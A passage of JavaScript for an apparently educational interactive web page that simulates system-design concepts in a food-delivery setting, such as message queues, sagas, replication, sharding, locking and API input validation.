    if(auto&&Math.random()<0.7)q.push(msg(false));
    const cur=[];
    for(let i=0;i<consumers;i++){
      const m=q.shift();if(!m)break;cur.push(m.id);m.at++;
      const fails=m.poison||Math.random()<0.12;
      if(!fails){done++;R.add(m.id+' processed','ok')}
      else if(m.at>=maxA){dlq.push(m);R.add(m.id+' failed '+m.at+' times → moved to the dead-letter queue','err')}
      else{q.push(m);R.add(m.id+' failed (attempt '+m.at+' of '+maxA+') → back on the queue','warn')}
    }
    paint(cur);
  };
  body.append(
    h('div',{class:'ctrls'},btn('Place order',()=>{q.push(msg(false));paint()},'pri'),btn('Send a poison message',()=>{q.push(msg(true));paint()},'bad'),btn('Fix the bug and redrive the DLQ',()=>{dlq.forEach(m=>{m.poison=false;m.at=0;q.push(m)});R.add('redrove '+dlq.length+' message(s) from the DLQ','ok');dlq=[];paint()}),toggle('Orders arrive on their own',false,v=>{auto=v})),
    h('div',{class:'ctrls'},range('Consumers',1,3,1,consumers,v=>{consumers=v;paint()}),range('Max attempts before DLQ',1,5,1,maxA,v=>{maxA=v})),
    h('div',{class:'sm dim'},'Queue'),qEl,cEl,h('div',{class:'sm dim'},'Dead-letter queue'),dEl,h('div',{class:'stats'},sD,sQ,sX),R.el);
  paint();live(body,700,tick);
});

card('infra','pubsub','Pub/Sub and event-driven design',['Pub/Sub','Event-Driven Architecture'],
'The orders service announces what happened and does not know who is listening. Tick a box to add a subscriber, and the publisher never changes.',
body=>{
  const TOP=['order.placed','payment.captured','order.delivered'];
  const SUB=['Kitchen','Billing','Notifications','Analytics','Loyalty'];
  const on={Kitchen:[1,0,0],Billing:[0,1,0],Notifications:[1,1,1],Analytics:[1,1,1],Loyalty:[0,0,0]};
  const got={};SUB.forEach(s=>got[s]=0);const R=receipt(),cnt={};
  const rows=SUB.map(s=>{
    cnt[s]=h('td',{class:'mono num'},'0');
    return h('tr',null,h('th',null,s),TOP.map((t,i)=>h('td',null,h('input',{type:'checkbox',id:uid('s'),checked:!!on[s][i],'aria-label':s+' subscribes to '+t,onchange:e=>{on[s][i]=e.target.checked?1:0;R.add(s+(e.target.checked?' subscribed to ':' unsubscribed from ')+t+'. The publisher was not touched.','dim')}}))),cnt[s]);
  });
  const publish=i=>{
    const to=SUB.filter(s=>on[s][i]);to.forEach(s=>{got[s]++;cnt[s].textContent=got[s]});
    R.add('published '+TOP[i]+' → '+(to.length?to.join(', '):'nobody is listening (the event is simply dropped)'),to.length?'ok':'warn');
  };
  body.append(
    h('div',{class:'ctrls'},TOP.map((t,i)=>btn('Publish '+t,()=>publish(i),i===0?'pri':''))),
    h('div',{class:'scroll'},h('table',{class:'tbl'},h('thead',null,h('tr',null,h('th',null,'Subscriber'),TOP.map(t=>h('th',null,t)),h('th',null,'Received'))),h('tbody',null,rows))),R.el);
  R.add('Loyalty is not subscribed yet. Tick order.delivered for it, then publish.','dim');
});

card('infra','saga','Saga with compensating actions',['Distributed Transactions','Saga Pattern'],
'Reserving food, charging the card and assigning a rider live in three services with three databases, so there is no single transaction. A saga undoes completed steps when a later one fails.',
body=>{
  const ST=[['Reserve food','Release food'],['Charge card','Refund card'],['Assign rider','—']];
  let failAt='none',mode='saga',busy=false;
  const R=receipt(),verdict=h('div',{class:'bigstate'},'');
  const rows=ST.map(s=>({f:h('span',{class:'pill'},'waiting'),c:h('span',{class:'pill'},'—')}));
  const el=ST.map((s,i)=>h('div',{class:'node'},h('b',null,s[0]),h('div',{class:'sm'},rows[i].f),h('div',{class:'sm dim'},'undo: '+s[1]+' ',rows[i].c)));
  const setP=(p,t,c)=>{p.textContent=t;p.className='pill '+(c||'')};
  const run=async()=>{
    if(busy)return;busy=true;R.clear();verdict.textContent='RUNNING';verdict.className='bigstate warn';
    rows.forEach((r,i)=>{setP(r.f,'waiting');setP(r.c,'—')});
    let failed=-1;
    for(let i=0;i<ST.length;i++){
      setP(rows[i].f,'running…','warn');await sleep(450);
      if(failAt===['food','charge','rider'][i]){setP(rows[i].f,'failed','bad');R.add('✗ '+ST[i][0]+' failed','err');failed=i;break}
      setP(rows[i].f,'done','good');R.add('✓ '+ST[i][0],'ok');
    }
    if(failed<0){verdict.textContent='ORDER CONFIRMED';verdict.className='bigstate good';busy=false;return}
    if(mode==='saga'){
      for(let j=failed-1;j>=0;j--){setP(rows[j].c,'compensating','warn');await sleep(450);setP(rows[j].c,'undone','good');R.add('↩ '+ST[j][1],'warn')}
      verdict.textContent='CANCELLED CLEANLY';verdict.className='bigstate good';
      R.add('Every service is back to a consistent state. Customer sees "could not place order".','ok');
    }else{
      const left=ST.slice(0,failed).map(s=>s[0].toLowerCase());
      verdict.textContent='INCONSISTENT';verdict.className='bigstate bad';
      R.add('No compensation ran. Still holding: '+(left.join(' and ')||'nothing')+'. Customer was charged for food that will never arrive.','err');
    }
    busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['none','Everything works'],['charge','Card is declined'],['rider','No rider available']],failAt,v=>{failAt=v}),seg([['saga','With saga'],['naive','No compensation']],mode,v=>{mode=v}),btn('Place order',run,'pri')),
    h('div',{class:'nodes'},el),verdict,R.el);
  verdict.textContent='READY';verdict.className='bigstate';
});

/* ===== B · databases & performance ===== */

card('data','nplus1','The N+1 query problem',['N+1 Queries'],
'The orders page shows each order next to its restaurant name. Written naively, that is one query for the list, then one more for every row.',
body=>{
  let n=20,mode='naive';
  const pre=h('pre',{class:'code'}),R=receipt();
  const rows={naive:barRow('Loop per row'),join:barRow('JOIN'),batch:barRow('Batch with IN')};
  const SQL=()=>({
    naive:'orders = SELECT * FROM orders LIMIT '+n+';\nfor each order:\n  SELECT name FROM restaurants WHERE id = order.restaurant_id;',
    join:'SELECT o.id, o.total, r.name\nFROM orders o\nJOIN restaurants r ON r.id = o.restaurant_id\nLIMIT '+n+';',
    batch:'orders = SELECT * FROM orders LIMIT '+n+';\nids = unique(orders.restaurant_id);\nSELECT id, name FROM restaurants WHERE id IN (ids);'
  });
  const cost=m=>m==='naive'?{q:1+n,ms:2.5*(1+n)+0.8+0.4*n}:m==='join'?{q:1,ms:3.3+0.15*n}:{q:2,ms:6.2+0.2*n};
  const paint=()=>{
    pre.textContent=SQL()[mode];
    const all=['naive','join','batch'].map(cost),mx=Math.max(...all.map(c=>c.ms));
    ['naive','join','batch'].forEach((k,i)=>rows[k].set(all[i].ms/mx*100,all[i].q+' queries · '+all[i].ms.toFixed(0)+' ms',k===mode?'var(--accent)':'var(--muted)'));
    R.clear();
    if(mode==='naive'){
      R.add('SELECT * FROM orders LIMIT '+n,'dim');
      for(let i=0;i<Math.min(4,n);i++)R.add('SELECT name FROM restaurants WHERE id = '+ri(1,40),'warn');
      if(n>4)R.add('… '+(n-4)+' more nearly identical queries','err');
    }else R.add(all[mode==='join'?1:2].q+' round trip'+(mode==='join'?'':'s')+' to the database, whatever the page size.','ok');
  };
  body.append(
    h('div',{class:'ctrls'},seg([['naive','Naive loop'],['join','JOIN'],['batch','Batch with IN']],mode,v=>{mode=v;paint()}),range('Orders on the page',5,100,5,n,v=>{n=v;paint()})),
    pre,h('div',{class:'bars'},rows.naive,rows.join,rows.batch),R.el);
  paint();
});

card('data','pool','Connection pooling',['Connection Pooling'],
'Opening a database connection costs a TCP and auth handshake, and Postgres only allows so many at once. A pool keeps a few connections open and lends them out.',
body=>{
  let pool=10,reqs=40,mode='pool';
  const cols=h('div',{class:'colchart'}),s50=stat('Median latency','–'),s95=stat('Slowest 5%','–'),sR=stat('Rejected',0,'good');
  const paint=()=>{
    const lat=[];let rej=0;
    for(let i=0;i<reqs;i++){
      if(mode==='pool')lat.push((Math.floor(i/pool)+1)*100+1);
      else if(i<20)lat.push(140);else{lat.push(null);rej++}
    }
    const ok=lat.filter(x=>x!==null).sort((a,b)=>a-b),q=p=>ok.length?ok[Math.min(ok.length-1,Math.floor(p*ok.length))]:0,mx=Math.max(100,...ok);
    cols.replaceChildren(...lat.map((l,i)=>h('i',{class:l===null?'rej':'',style:'height:'+(l===null?100:l/mx*100)+'%',title:'request '+(i+1)+': '+(l===null?'FATAL too many connections':l+' ms')})));
    s50.set(q(.5)+' ms');s95.set(q(.95)+' ms');sR.set(rej,rej?'bad':'good');
  };
  body.append(
    h('div',{class:'ctrls'},seg([['pool','Pool'],['none','New connection per request']],mode,v=>{mode=v;paint()})),
    h('div',{class:'ctrls'},range('Pool size',1,30,1,pool,v=>{pool=v;paint()}),range('Requests at once',5,60,5,reqs,v=>{reqs=v;paint()})),
    cols,h('div',{class:'sm dim'},'One bar per request, taller means slower. Each query takes 100 ms. A new connection adds 40 ms, and the database allows 20 connections.'),
    h('div',{class:'stats'},s50,s95,sR));
  paint();
});

card('data','repl','Replication, read replicas and eventual consistency',['Read Replicas','Replication','Eventual Consistency'],
'Writes go to the primary and trickle out to replicas. Reads on a replica are fast and cheap, but may briefly show the old status.',
body=>{
  const ST=['Order placed','Preparing','Out for delivery','Delivered'];
  let lag=1500,ryw=false,lastW=0;
  const N=['Primary','Replica 1','Replica 2'].map(n=>({n,v:1,pend:0,val:h('div',{class:'mono sm'},''),st:h('div',{class:'sm'},'')}));
  N.forEach(x=>{x.el=h('div',{class:'node'},h('b',null,x.n),x.val,x.st)});
  const R=receipt();
  const lab=v=>ST[(v-1)%4];
  const paint=()=>N.forEach(x=>{
    x.val.textContent='v'+x.v+' · '+lab(x.v);
    x.st.textContent=x.pend?'receiving changes…':(x.v===N[0].v?'in sync':'behind');
    x.el.className='node'+(x===N[0]?'':(x.v===N[0].v?' ok':' bad'));
  });
  const write=()=>{
    N[0].v++;const target=N[0].v;lastW=Date.now();
    R.add("UPDATE orders SET status = '"+lab(target)+"' → committed on the primary (v"+target+')','ok');
    [1,2].forEach(k=>{
      N[k].pend++;
      setTimeout(()=>{N[k].v=Math.max(N[k].v,target);N[k].pend--;paint();if(N.every(x=>x.v===N[0].v&&!x.pend))R.add('all replicas have caught up (eventually consistent)','dim')},lag*(k===1?1:1.7));
    });
    paint();
  };
  const read=k=>{
    if(ryw&&k>0&&Date.now()-lastW<5000){R.add('read routed to the primary (you wrote less than 5 s ago)','ok');k=0}
    const x=N[k],stale=x.v<N[0].v;
    R.add('SELECT status on '+x.n+' → "'+lab(x.v)+'"'+(stale?'   ← STALE, the primary already has "'+lab(N[0].v)+'"':''),stale?'err':'ok');
  };
  body.append(
    h('div',{class:'ctrls'},btn('Advance order status (write)',write,'pri'),btn('Read from primary',()=>read(0)),btn('Read from replica 1',()=>read(1)),btn('Read from replica 2',()=>read(2))),
    h('div',{class:'ctrls'},range('Replication lag',0,3000,100,lag,v=>{lag=v},v=>v+' ms'),toggle('Read-your-writes: use primary right after a write',false,v=>{ryw=v})),
    h('div',{class:'nodes'},N.map(x=>x.el)),R.el);
  paint();R.add('Write, then read from a replica straight away.','dim');
});

card('data','cap','CAP theorem in a network partition',['CAP Theorem'],
'Two kitchens, Mumbai and Hyderabad, share a count of 3 biryani portions. Cut the link between them and you must choose: refuse orders, or accept them and risk selling too many.',
body=>{
  let mode='cp',part=false,clock=0,sold=0;
  const N={M:{n:'Mumbai',stock:3,ts:0},H:{n:'Hyderabad',stock:3,ts:0}};
  const R=receipt(),link=h('div',{class:'bigstate good'},'LINK UP');
  ['M','H'].forEach(k=>{N[k].txt=h('div',{class:'mono sm'},'');N[k].el=h('div',{class:'node'},h('b',null,N[k].n),N[k].txt)});
  const paint=()=>{
    ['M','H'].forEach(k=>{N[k].txt.textContent='stock = '+N[k].stock;N[k].el.className='node'+((N.M.stock!==N.H.stock)?' warn':' ok')});
    link.textContent=part?'PARTITIONED':'LINK UP';link.className='bigstate '+(part?'bad':'good');
  };
  const other=k=>k==='M'?'H':'M';
  const order=k=>{
    const x=N[k],y=N[other(k)];
    if(part&&mode==='cp'){R.add(x.n+': order refused (503). It cannot reach '+y.n+' to agree, so it will not guess.','err');return}
    if(x.stock<=0){R.add(x.n+': sold out','warn');return}
    x.stock--;x.ts=++clock;sold++;
    if(part){R.add(x.n+': order accepted on local data, stock '+x.stock+'. '+y.n+' cannot be told.','warn')}
    else{y.stock=x.stock;y.ts=x.ts;R.add(x.n+': order accepted, stock '+x.stock+', copied to '+y.n,'ok')}
    paint();
  };
  const read=k=>{
    const x=N[k];
    if(part&&mode==='cp'){R.add(x.n+': read refused (503), cannot confirm it is current','err');return}
    R.add(x.n+': stock = '+x.stock+(part&&N.M.stock!==N.H.stock?'  (the other kitchen says '+N[other(k)].stock+')':''),part&&N.M.stock!==N.H.stock?'warn':'ok');
  };
  const setPart=v=>{
    part=v;
    if(v)R.add('— network partition: the two kitchens cannot talk —','err');
    else{
      R.add('— partition healed —','ok');
      if(N.M.stock!==N.H.stock){
        const win=N.M.ts>N.H.ts?N.M:N.H;
        R.add('Mumbai says '+N.M.stock+', Hyderabad says '+N.H.stock+'. Last-write-wins keeps '+win.stock+'.','warn');
        R.add(sold+' portions were sold but only 3 existed'+(sold>3?': oversold by '+(sold-3)+'.':'.'),sold>3?'err':'ok');
        N.M.stock=N.H.stock=win.stock;
      }
    }
    paint();
  };
  const tog=toggle('Partition the network',false,setPart);
  body.append(
    h('div',{class:'ctrls'},seg([['cp','Consistency first (CP)'],['ap','Availability first (AP)']],mode,v=>{mode=v}),tog),
    h('div',{class:'ctrls'},btn('Order at Mumbai',()=>order('M'),'pri'),btn('Order at Hyderabad',()=>order('H'),'pri'),btn('Read Mumbai',()=>read('M')),btn('Read Hyderabad',()=>read('H')),btn('Reset',()=>{N.M.stock=N.H.stock=3;sold=0;part=false;tog.set(false);R.clear();R.add('Reset: 3 portions, link up.','dim');paint()})),
    link,h('div',{class:'nodes'},N.M.el,N.H.el),R.el);
  paint();R.add('Partition the network, then order at both kitchens in each mode.','dim');
});

card('data','shard','Partitioning (sharding)',['Partitioning'],
'One database cannot hold every order forever. Pick a shard key, and the choice decides whether load spreads evenly or piles onto one machine.',
body=>{
  const rand=mulberry(7),orders=Array.from({length:400},(_,i)=>{const r=rand();return{id:i+1,user:Math.floor(rand()*5000)+1,city:r<.45?0:r<.7?1:r<.85?2:3}});
  const CITY=['Hyderabad','Bengaluru','Mumbai','Delhi'];
  let strat='hash',N=4;
  const shardOf=(o,s,n)=>s==='hash'?hash32(o.user)%n:s==='range'?Math.min(n-1,Math.floor((o.id-1)/(400/n))):o.city%n;
  const stor=h('div',{class:'bars'}),writes=h('div',{class:'bars'}),note=h('div',{class:'sm'},''),R=receipt();
  const paint=()=>{
    const st=new Array(N).fill(0),wr=new Array(N).fill(0);
    orders.forEach((o,i)=>{const s=shardOf(o,strat,N);st[s]++;if(i>=300)wr[s]++});
    const mk=(arr,max)=>arr.map((v,i)=>{const r=barRow('Shard '+(i+1));r.set(v/max*100,String(v),v/(arr.reduce((a,b)=>a+b,0)/N)>1.6?'var(--bad)':'var(--accent)');return r});
    stor.replaceChildren(...mk(st,Math.max(...st,1)));writes.replaceChildren(...mk(wr,Math.max(...wr,1)));
    const hot=Math.max(...wr)/(100/N)>1.6||Math.max(...st)/(400/N)>1.6;
    note.textContent=hot?'Hot shard: one machine takes most of the load while the others idle.':'Load is spread evenly across shards.';
    note.className='sm '+(hot?'errtext':'oktext');
  };
  const reshard=()=>{
    if(N===5){N=4;R.add('Back to 4 shards.','dim');paint();return}
    const moved=orders.filter(o=>shardOf(o,strat,4)!==shardOf(o,strat,5)).length/4;
    N=5;paint();
    R.add('Added a fifth shard with '+(strat==='hash'?'hash(user) mod N':strat==='range'?'equal id ranges':'city mapping')+': '+Math.round(moved)+'% of rows must move.','warn');
    R.add('Consistent hashing moves only about 20% (1 in 5) when a node joins.','dim');
  };
  body.append(
    h('div',{class:'ctrls'},seg([['hash','Hash of user id'],['range','Range of order id'],['city','By city']],strat,v=>{strat=v;paint()}),btn('Add or remove a shard',reshard)),
    h('div',{class:'sm dim'},'Rows stored (400 orders)'),stor,h('div',{class:'sm dim'},'Writes in the last minute (newest 100 orders)'),writes,note,R.el);
  paint();
});

card('data','leader','Leader election',['Leader Election'],
'Five scheduler nodes, one leader assigns riders. Kill the leader and followers wait for a random timeout. The first to time out asks for votes, and a majority wins.',
body=>{
  let term=1,leader=3,timer=null;
  const N=[1,2,3,4,5].map(id=>({id,alive:true}));
  const R=receipt(),info=h('div',{class:'sm mono'},'');
  N.forEach(x=>{x.role=h('div',{class:'sm'},'');x.el=h('div',{class:'node'},h('b',null,'node '+x.id),x.role)});
  const liveN=()=>N.filter(x=>x.alive);
  const paint=()=>{
    N.forEach(x=>{x.role.textContent=!x.alive?'down':x.id===leader?'LEADER':'follower';x.el.className='node '+(!x.alive?'dim':x.id===leader?'ok':'')});
    info.textContent='term '+term+' · '+liveN().length+' of 5 alive · '+(leader?'leader: node '+leader:'no leader');
  };
  const elect=()=>{
    if(timer||leader)return;
    if(liveN().length<3){R.add('Only '+liveN().length+' nodes alive. A majority needs 3, so no leader can be elected.','err');paint();return}
    const cand=pick(liveN()),t=ri(1000,2400);
    R.add('followers stopped hearing heartbeats. Node '+cand.id+' times out first, after '+t+' ms.','dim');
    timer=setTimeout(()=>{
      timer=null;term++;
      const votes=liveN().length;
      R.add('node '+cand.id+' becomes a candidate for term '+term+' and asks for votes: '+votes+' of 5 granted','warn');
      leader=cand.id;R.add('node '+cand.id+' wins with a majority and starts sending heartbeats','ok');paint();
    },t);
  };
  const after=()=>{
    if(leader&&liveN().length<3){R.add('Leader lost contact with a majority and steps down.','err');leader=null}
    if(leader&&!N.find(x=>x.id===leader).alive)leader=null;
    paint();elect();
  };
  body.append(
    h('div',{class:'ctrls'},btn('Kill the leader',()=>{if(!leader){R.add('There is no leader to kill.','warn');return}const l=N.find(x=>x.id===leader);l.alive=false;R.add('node '+l.id+' (leader) crashed','err');leader=null;after()},'bad'),btn('Kill a random follower',()=>{const f=liveN().filter(x=>x.id!==leader);if(!f.length)return;const x=pick(f);x.alive=false;R.add('node '+x.id+' crashed','err');after()},'bad'),btn('Revive all nodes',()=>{N.forEach(x=>x.alive=true);R.add('all nodes are back and follow the current leader','ok');after()})),
    h('div',{class:'nodes five'},N.map(x=>x.el)),info,R.el);
  paint();R.add('Node 3 is the leader in term 1.','dim');
});

card('data','realtime','Real-time delivery tracking: polling, SSE, WebSockets',['WebSockets','Long Polling','Server-Sent Events'],
'The customer watches the rider move on a map. Four ways to push those updates to the phone, replayed over the same 60 seconds of events.',
body=>{
  const gen=()=>{const ev=[];let t=0;for(;;){t+=-Math.log(1-Math.random())*3.5;if(t>=60)break;ev.push(t)}return ev};
  let interval=3,ev=gen();
  const T=[['poll','Short polling'],['long','Long polling'],['sse','Server-Sent Events'],['ws','WebSocket']];
  const reqs={},dly={};T.forEach(([k,l])=>{reqs[k]=barRow(l);dly[k]=barRow(l)});
  const note=h('div',{class:'sm dim'},'');
  const calc=()=>{
    const n=ev.length,avg=a=>a.reduce((x,y)=>x+y,0)/Math.max(1,a.length);
    return{poll:{r:Math.floor(60/interval),d:avg(ev.map(t=>(interval-(t%interval))*1000))},long:{r:n+1,d:70},sse:{r:1,d:25},ws:{r:1,d:20}};
  };
  const paint=()=>{
    const c=calc(),mr=Math.max(...T.map(([k])=>c[k].r)),md=Math.max(...T.map(([k])=>c[k].d));
    T.forEach(([k])=>{reqs[k].set(c[k].r/mr*100,c[k].r+' requests');dly[k].set(c[k].d/md*100,Math.round(c[k].d)+' ms')});
    note.textContent=ev.length+' location updates in this run. Polling pays for every empty check. SSE is one-way (server to phone) and reconnects by itself. WebSocket is two-way, which suits chat with the rider.';
  };
  body.append(
    h('div',{class:'ctrls'},range('Polling interval',1,10,1,interval,v=>{interval=v;paint()},v=>v+' s'),btn('Replay with new random events',()=>{ev=gen();paint()},'pri')),
    h('div',{class:'sm dim'},'HTTP requests in 60 seconds'),h('div',{class:'bars'},T.map(([k])=>reqs[k])),
    h('div',{class:'sm dim'},'Average delay before the customer sees an update'),h('div',{class:'bars'},T.map(([k])=>dly[k])),note);
  paint();
});

card('data','index','Database indexing and query optimization',['Database Indexing','Query Optimization'],
'A rider app asks for the last 20 delivered orders of one restaurant. The same query takes 60 ms or 0.1 ms depending on the index behind it.',
body=>{
  let ix='none',limit=false,star=true;
  const pre=h('pre',{class:'code'}),planEl=h('div',{class:'mono sm'},''),rowsBar=barRow('Rows examined'),msBar=barRow('Estimated time'),sP=stat('Payload to the app','–'),sW=stat('Extra write cost','+0%');
  const plan=()=>{
    if(ix==='none')return{p:'Seq Scan on orders → Filter → Sort → Limit',rows:20000,sort:true,idx:0};
    if(ix==='rest')return{p:'Index Scan on idx_restaurant_id → Filter status → Sort',rows:100,sort:true,idx:1};
    if(ix==='status')return{p:'Index Scan on idx_status (70% of the table) → Filter → Sort',rows:14000,sort:true,idx:1};
    return{p:'Index Scan on idx_restaurant_status_created, already in order, no Sort',rows:limit?20:70,sort:false,idx:1};
  };
  const paint=()=>{
    const p=plan(),ret=limit?20:70,ms=p.rows*0.003+(p.sort?0.3:0)+ret*(star?0.02:0.003);
    pre.textContent='SELECT '+(star?'*':'id, total, created_at')+'\nFROM orders\nWHERE restaurant_id = 42 AND status = \'DELIVERED\'\nORDER BY created_at DESC'+(limit?'\nLIMIT 20':'')+';';
    planEl.textContent='EXPLAIN: '+p.p;
    rowsBar.set(p.rows/20000*100,p.rows.toLocaleString('en-IN'),p.rows>5000?'var(--bad)':'var(--good)');
    msBar.set(Math.min(100,ms/70*100),ms<1?ms.toFixed(2)+' ms':ms.toFixed(0)+' ms',ms>10?'var(--bad)':'var(--good)');
    sP.set(Math.round(ret*(star?1.8:0.05))+' KB');
    sW.set('+'+(p.idx*12)+'% per INSERT',p.idx?'warn':'');
  };
  body.append(
    h('div',{class:'ctrls'},seg([['none','No index'],['rest','restaurant_id'],['status','status'],['comp','restaurant_id, status, created_at']],ix,v=>{ix=v;paint()})),
    h('div',{class:'ctrls'},toggle('Add LIMIT 20',false,v=>{limit=v;paint()}),toggle('SELECT * (every column)',true,v=>{star=v;paint()})),
    pre,planEl,h('div',{class:'bars'},rowsBar,msBar),h('div',{class:'stats'},sP,sW),
    h('div',{class:'sm dim'},'Table: 20,000 orders, 200 restaurants, 70% delivered. The status index barely narrows anything, which is why it loses to the composite one.'));
  paint();
});

card('data','locking','Optimistic and pessimistic locking',['Optimistic Locking','Pessimistic Locking'],
'One portion of biryani is left and two customers tap Order in the same instant. Each strategy handles the race differently.',
body=>{
  let mode='none',busy=false;
  const S={
    none:[['Asha','SELECT stock → 1',''],['Ravi','SELECT stock → 1',''],['Asha','UPDATE stock = 0 → order confirmed','ok'],['Ravi','UPDATE stock = 0 → order confirmed','err']],
    pess:[['Asha','BEGIN; SELECT … FOR UPDATE → 1, row is now locked',''],['Ravi','SELECT … FOR UPDATE → blocked, waiting for Asha','warn'],['Asha','UPDATE stock = 0; COMMIT → order confirmed, lock released','ok'],['Ravi','lock acquired, SELECT → 0 → sold out, no order','ok']],
    opt:[['Asha','SELECT stock, version → 1, v7',''],['Ravi','SELECT stock, version → 1, v7',''],['Asha','UPDATE … SET stock = 0, version = 8 WHERE version = 7 → 1 row, confirmed','ok'],['Ravi','UPDATE … WHERE version = 7 → 0 rows. Conflict, so re-read: 0 left, sold out','ok']]
  };
  const R=receipt(),sO=stat('Orders confirmed','–'),sS=stat('Portions in stock',1),v=h('div',{class:'bigstate'},'READY');
  const run=async()=>{
    if(busy)return;busy=true;R.clear();v.textContent='RUNNING';v.className='bigstate warn';
    for(const [who,txt,c] of S[mode]){R.add(who.padEnd(5)+' '+txt,c);await sleep(520)}
    const oversold=mode==='none';
    sO.set(oversold?2:1,oversold?'bad':'good');sS.set(oversold?'-1':'0',oversold?'bad':'good');
    v.textContent=oversold?'OVERSOLD: 2 orders, 1 portion':'CORRECT: 1 order, 1 portion';v.className='bigstate '+(oversold?'bad':'good');
    busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['none','No locking'],['pess','Pessimistic (FOR UPDATE)'],['opt','Optimistic (version column)']],mode,x=>{mode=x}),btn('Both tap Order at once',run,'pri')),
    v,h('div',{class:'stats'},sO,sS),R.el,
    h('div',{class:'sm dim'},'Pessimistic locks first and makes others wait: safe when conflicts are common. Optimistic checks at write time and retries: cheaper when conflicts are rare.'));
});

card('data','deadlock','Deadlocks',['Deadlocks'],
'Assigning a rider updates an order row and a rider row. Two transactions grab those rows in opposite order, and each waits forever for the other.',
body=>{
  let mode='opp',busy=false;
  const S={
    opp:[['T1','BEGIN; lock order #41','ok'],['T2','BEGIN; lock rider #9','ok'],['T1','wants rider #9 → waits for T2','warn'],['T2','wants order #41 → waits for T1','warn'],['DB','wait-for graph: T1 → T2 → T1. Cycle! Deadlock detected, aborting T2.','err'],['T1','gets rider #9, COMMIT','ok'],['T2','app retries the whole transaction → COMMIT','ok']],
    ord:[['T1','BEGIN; lock order #41 (orders always first)','ok'],['T2','BEGIN; wants order #41 → waits, holding nothing','warn'],['T1','lock rider #9, COMMIT, both locks released','ok'],['T2','lock order #41, lock rider #9, COMMIT','ok'],['DB','no cycle was possible, no deadlock','ok']]
  };
  const R=receipt(),v=h('div',{class:'bigstate'},'READY');
  const run=async()=>{
    if(busy)return;busy=true;R.clear();v.textContent='RUNNING';v.className='bigstate warn';
    for(const [who,txt,c] of S[mode]){R.add(who.padEnd(3)+' '+txt,c);await sleep(520)}
    v.textContent=mode==='opp'?'DEADLOCK, ONE TRANSACTION KILLED':'FINISHED, NO DEADLOCK';v.className='bigstate '+(mode==='opp'?'bad':'good');busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['opp','Locks taken in opposite order'],['ord','Same lock order everywhere']],mode,x=>{mode=x}),btn('Run both transactions',run,'pri')),
    v,R.el,h('div',{class:'sm dim'},'The database breaks the cycle by killing a victim, so the app must be ready to retry. Taking locks in one fixed order prevents the cycle entirely.'));
});

card('data','dlock','Distributed lock with fencing token',['Distributed Locks'],
'Only one worker may run the 8 pm payout job. A Redis lock with a TTL guards it, but a paused worker can wake up believing it still holds a lock that has already expired.',
body=>{
  let fence=false,busy=false;
  const S=()=>fence?[
    ['A','SET lock:payout NX PX 3000 → OK, fencing token 33','ok'],['A','long GC pause begins (5 s)','warn'],['Redis','lock expires after 3 s','dim'],['B','SET lock:payout NX PX 3000 → OK, fencing token 34','ok'],['B','write payouts.csv with token 34 → accepted, highest token seen is 34','ok'],['A','wakes up, still thinks it holds the lock. Writes with token 33','warn'],['Storage','rejected: token 33 is older than 34. Payouts are safe.','ok']
  ]:[
    ['A','SET lock:payout NX PX 3000 → OK','ok'],['A','long GC pause begins (5 s)','warn'],['Redis','lock expires after 3 s','dim'],['B','SET lock:payout NX PX 3000 → OK','ok'],['B','writes payouts.csv, job done','ok'],['A','wakes up, still thinks it holds the lock, writes payouts.csv','warn'],['Storage','accepted. Riders were paid twice and the file is corrupt.','err']
  ];
  const R=receipt(),v=h('div',{class:'bigstate'},'READY');
  const run=async()=>{
    if(busy)return;busy=true;R.clear();v.textContent='RUNNING';v.className='bigstate warn';
    for(const [who,txt,c] of S()){R.add(who.padEnd(7)+' '+txt,c);await sleep(500)}
    v.textContent=fence?'SAFE: STALE WRITE REJECTED':'DOUBLE PAYOUT';v.className='bigstate '+(fence?'good':'bad');busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},toggle('Storage checks a fencing token',false,x=>{fence=x}),btn('Run the scenario',run,'pri')),
    v,R.el,h('div',{class:'sm dim'},'A TTL stops a crashed worker from holding the lock forever, but it cannot stop a slow one. The token lets the storage layer be the final judge.'));
});

card('data','validate','Data validation at the API boundary',['Data Validation'],
'Never trust what the client sends. The server checks shape, types and ranges, rejects unknown fields, and prices the order itself.',
body=>{
  const P={
    good:{items:[{sku:'BIRYANI-01',qty:2},{sku:'RAITA',qty:1}],address:'12-4-7 Beach Road, Visakhapatnam',coupon:'WELCOME50'},
    qty:{items:[{sku:'BIRYANI-01',qty:-3}],address:'12-4-7 Beach Road, Visakhapatnam'},
    price:{items:[{sku:'BIRYANI-01',qty:1}],address:'12-4-7 Beach Road, Visakhapatnam',total:1},
    admin:{items:[{sku:'RAITA',qty:1}],address:'12-4-7 Beach Road, Visakhapatnam',isAdmin:true},
    long:{items:[{sku:'RAITA',qty:1}],address:'x'.repeat(300)}
  };
  const ta=h('textarea',{id:uid('t'),class:'ta',rows:8,spellcheck:'false','aria-label':'Request body'}),out=h('div',{class:'steps'}),v=h('div',{class:'bigstate'},'');
  const check=raw=>{
    const errs=[];let o;
    try{o=JSON.parse(raw)}catch(e){return['Body is not valid JSON: '+e.message]}
    if(typeof o!=='object'||o===null||Array.isArray(o))return['Body must be a JSON object'];
    Object.keys(o).forEach(k=>{if(!['items','address','coupon'].includes(k))errs.push('$.'+k+': unknown field, rejected'+(k==='total'?' (the server sets prices, never the client)':k==='isAdmin'?' (blocks mass assignment)':''))});
    if(!Array.isArray(o.items)||o.items.length<1||o.items.length>30)errs.push('$.items: must be a list of 1 to 30 items');
    else o.items.forEach((it,i)=>{
      if(typeof it!=='object'||it===null){errs.push('$.items['+i+']: must be an object');return}
      if(typeof it.sku!=='string'||!/^[A-Z0-9-]{3,12}$/.test(it.sku))errs.push('$.items['+i+'].sku: 3 to 12 characters, A-Z, 0-9 or dash');
      if(!Number.isInteger(it.qty)||it.qty<1||it.qty>20)errs.push('$.items['+i+'].qty: whole number from 1 to 20');
    });
    if(typeof o.address!=='string'||o.address.trim().length<5||o.address.length>200)errs.push('$.address: text between 5 and 200 characters');
    if(o.coupon!==undefined&&(typeof o.coupon!=='string'||!/^[A-Z0-9]{1,12}$/.test(o.coupon)))errs.push('$.coupon: up to 12 characters, A-Z and 0-9');
    return errs;
  };
  const run=()=>{
    const errs=check(ta.value);
